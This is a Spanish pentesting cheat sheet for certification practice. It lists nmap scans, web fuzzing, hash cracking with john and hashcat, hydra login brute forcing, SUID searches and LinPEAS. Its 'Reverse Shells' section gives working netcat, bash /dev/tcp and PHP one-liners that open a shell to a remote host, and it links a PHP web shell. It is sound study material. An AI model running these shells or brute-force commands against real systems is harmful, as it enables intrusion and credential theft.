# Comandos Generales

A continuación presentare todos los comandos que he necesitado para aprobar las certificaciones con éxito. (No necesariamente usara todos, aunque si la mayoria)

### Hosts

**Actividad Del host**&#x20;

> ```bash
> ping -c 1 10.10.10.10  |  Si TTL -> 128 Windows Si TTL -> 64 Linux
> ```

**Nombre Host**&#x20;

> ```bash
> hostname
> ```

**Información Sistema Operativo**

> ```bash
> uname -a
> ```
>
> ```bash
> cat /proc/versión
> ```
>
> ```bash
> cat /etc/issue
> ```

### **Routing**

> ```bash
> ip route add <network_ip>/ via <gateway_ip>
> ```

### Reconocimiento

**Escaneo Dispositivos Vivos**&#x20;

> ```bash
> fping -a -g 10.10.10.0/24  2>/dev/null
> ```

> ```bash
> nmap -sn 10.10.10.0/24 -oN Dispositivos.Vivos
> ```

**Escaneo Puertos Normal**&#x20;

> ```bash
> nmap 10.10.10.10 -p- --open -T5 -v -n -oG Puertos.Abiertos
> ```

**Escaneo Puertos Rapido**

> ```bash
> nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 10.10.10.10 -oG Puertos.Abiertos
> ```

**Escaneo Puertos UDP**

> ```bash
> nmap -sC -sV -sU --top-ports 100 10.10.10.10 -oG Puertos.Abiertos.UDP
> ```

**Escaneo Servicios**

> ```bash
> nmap -sC -sV -p80,443,445 10.10.10.10 -oN Versiones.Servicios
> ```

### Enumeración Web

**Wfuzz**

> **Fuzzing Directorios**
>
> ```bash
> wfuzz -c -L -t 200 --hc=404 -w <diccionario> http://ip-site/FUZZ
> ```

> **Fuzzing Archivos**
>
> ```bash
> wfuzz -c -L -t 200 --hc=404 --hw=0 -w http://ip-site/FUZZ.extension
> ```

> **Fuzzing Con Cookie**
>
> {% code overflow="wrap" %}
> ```bash
> wfuzz -c --hc=404 -z file,<diccionario> -b cookie="<insert cookie>" http://10.10.11.135/FUZZ
> ```
> {% endcode %}

| Código de estado | Significado                          |
| ---------------- | ------------------------------------ |
| 100              | Continuar                            |
| 200              | OK                                   |
| 201              | Creado                               |
| 202              | Aceptado                             |
| 203              | Sin contenido                        |
| 204              | Sin contenido                        |
| 301              | Permanentemente re dirigido o movido |
| 302              | Temporalmente re dirigido o movido   |
| 400              | Solicitud incorrecta                 |
| 401              | Requiere autorización                |
| 403              | Prohibido                            |
| 404              | No se encuentra                      |
| 500              | Error crítico en el servidor         |

**Gobuster**

> **Fuzzing De Directorios**
>
> ```bash
> gobuster -w <diccionario> dir -u http://ip-site
> ```

> **Fuzzing De Archivos**
>
> ```bash
> gobuster -w <diccionario> dir -u http://ip-site -x php,html,txt
> ```



**Nmap Script**

> ```bash
> nmap --script http-enum -p80 10.10.10.10 -oN Enumeracion.Web
> ```

### **Reverse Shells**

**Web Shell Interfaz**

> FTP - www.data
>
> ```bash
> https://github.com/artyuum/simple-php-web-shell
> ```

**Netcat**

> {% code overflow="wrap" lineNumbers="true" %}
> ```bash
> nc -e /bin/sh 10.0.0.1 1233 
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
> ```
> {% endcode %}

**Bash**

> ```bash
> bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
> ```

**PHP**

> ```bash
> $sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");
> ```

### Encode / Decode

> **Codificar Texto Base64**
>
> ```bash
> echo -n "text" | base64
> ```

> **Codificar Archivo  Base64**
>
> ```bash
> cat file | base64 -w0
> ```

> **Decodificar Texto Base64**
>
> ```bash
> echo -n "text | base64 -di
> ```

> **Decodificar Archivo Base64**
>
> ```bash
> echo -n "codificacion.salida" | base64 -di > file
> ```

### Tratamiento TTY

> <pre class="language-bash" data-line-numbers><code class="lang-bash"><strong>script /dev/null -c bash
> </strong>ctrl + z
> stty raw -echo; fg
> reset
> xterm
> export TERM=xterm
> export SHELL=bash
> stty -a | aplicar en nueva ventana
> stty rows columns
> </code></pre>

> **Python**&#x20;
>
> ```bash
> python -c 'import pty; pty.spawn("/bin/bash")'
> ```

### **Servidores Web**

> **Python3**
>
> ```bash
> python3 -m http.server 80
> ```

> **Netcat**
>
> ```basic
> nc -lvnp 8080
> ```

> **SCP**&#x20;
>
> ```bash
> scp file.jpg user@10.10.10.10:/home/user/
> ```

### Busqueda De Exploits

> **Busqueda Exploit**
>
> ```bash
> searchsploit apache
> ```

> **Inspeccionar Exploit**
>
> ```bash
> searchsploit -x id.exploit
> ```

> **Descargar Exploits**
>
> ```bash
> searchsploit -m id.exploit
> ```

### Análisis De Archivos

> **Ver Tipo De Archivo**
>
> ```bash
> file archivo.fille
> ```

> **Extraer Información**
>
> ```bash
> strings file
> ```

> **Buscar Archivos Ocultos**
>
> ```bash
> binwalk file
> ```
>
> ```bash
> steghide info file.jpg
> ```

> **Extraer Archivos Ocultos**
>
> ```bash
> binwalk -e file
> ```
>
> ```bash
> steghide extract -sf file.jpg
> ```

### Certificados SSL

> **Inspeccionar Certificado**
>
> ```bash
> openssl s_client -connect 10.10.10.10:443
> ```

### Utilidades Del Sistema

**Tar**

> **Comprimir Archivos**
>
> ```bash
> tar -zcvf salida.tar.gz archivo-directorio
> ```

> **Descomprimir Archivos**
>
> ```bash
> tar -xvf archivo-directorio.tar.gz
> ```

**Administrador De Tareas**

> ```bash
> ps -faux
> ```

**Rutas De Red**

> **Enumerar Protocolos TCP**
>
> ```bash
> netstat -at
> ```

> **Enumerar Protocolos UDP**
>
> ```bash
> netstat -au
> ```

> **Enumerar Protocolos En Escucha**
>
> ```bash
> netstat -l
> ```

**Capabilities**

> ```bash
> getcap -r / 2</dev/null
> ```

**Crontab**

> ```bash
> cat /etc/crontab
> ```

**Path**

> Exportar Ruta Al Path
>
> ```bash
> export PATH=/tmp:$PATH
> ```

**Generar Hash**

> Generar Hash Passwd
>
> ```bash
> mkpasswd -m sha-512 contraseña
> ```

**Ver Historial CLI**

> ```bash
> cat ~/.*history | less
> ```

### Filtrado De Información

**Comando cut**

> ```bash
> cat /etc/passwd | cut -d ":" -f 1 | devuelve la primera linea
> ```

**Comando grep**

> ```bash
> cat /etc/passwd | grep "home" # Devuelve cualquier linea que contenga home
> ```

**Comando find**

> {% code overflow="wrap" lineNumbers="true" %}
> ```bash
> find . -name flag.txt # Busca el archivo "flag.txt" en el directorio actual
> find /home -name flag1.txt # Busca el archivo “flag.txt” en el directorio /home
> find / -type d -name config # Busca el directorio llamado config debajo de “/”
> find / -type f -perm 0777 # Busca archivos con los permisos 777 
> find / -perm a=x # Encontrar archivos ejecutables
> find /home -user frank # Encuentrar todos los archivos para el usuario "frank" en "/home
> find / -mtime 10 # Encuentra archivos que fueron modificados en los últimos 10 días
> find / -atime 10 # Busca archivos a los que se accedió en los últimos 10 días
> find / -size 50M # Encuentra archivos con un tamaño de 50 MB
> find / -perm -u=s -type f 2>/dev/null # buscar archivos con el bit SUID
> find / -type f -perm -04000 -ls 2>/dev/null # buscar archivos con los bits SUID o SGID.
> ```
> {% endcode %}



### Fuerza Bruta

**Hydra**

> **Fuerza Bruta Servicios**
>
> ```bash
> hydra -l <user> -P <diccionario> 10.10.10.10 <servicio> t4
> ```

> **Fuerza Bruta Formulario Web**
>
> {% code overflow="wrap" %}
> ```bash
> hydra -l <user> -P <diccionario> 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=Failed Message" -V 
> ```
> {% endcode %}

> {% code overflow="wrap" %}
> ```
> wfuzz -c -t 10 -L -w /usr/share/wordlists/rockyou.txt -d "username=USER&password=FUZZ" --hc 404 --hh 25999 http://10.10.10.10/login/
> ```
> {% endcode %}

**John The Ripper**

> **Fuerza Bruta Hashes**
>
> ```bash
> john --wordlist=<diccionario> password.file
> ```

> **Ver Contraseña**
>
> ```bash
> john file.hash --show
> ```

> **Creación Password Crack File**
>
> ```bash
> unshadow file.passwd file.shadow > password.file
> ```

> **Fuerza Bruta ZIP**
>
> ```bash
> zip2john file.zip > hash
> ```

**Hashcat**

> **Fuerza Bruta Hashes**
>
> ```bash
> hashcat -m <id hash> file.hash <diccionario>
> ```

> **Identificar Hash**
>
> ```bash
> hashcat file.hash --identify
> ```

> **Ver contraseña**
>
> ```bash
> hashcat -m <ID Hash> file.hash --show
> ```

### Herramientas

> **Detección Procesos Irregulares**
>
> ```bash
> https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
> ```

### Windows Análisis

> ```bash
> systeminfo # Ver la información respectiva de la máquina
> ```
>
> ```bash
> net user John # Ver la inforamción del usuario designado
> ```

### Escalada De Privilegios

> **LinPEAS**
>
> ```bash
> wget https://github.com/carlospolop/PEASS-ng/releases/download/20221218/linpeas.sh
> ```

### Tips Puertos Comunes

**23 | Telnet**

> **Script Nmap**
>
> ```bash
> nmap -n -sV -Pn --script "*telnet*" -p 23 <IP>
> ```

> **MSFConsole**
>
> ```bash
> use auxiliary/scanner/telnet/telnet_version
> ```

> **Banner Grabbing**
>
> ```bash
> nc -vn 23
> ```

**445 | Samba**

>
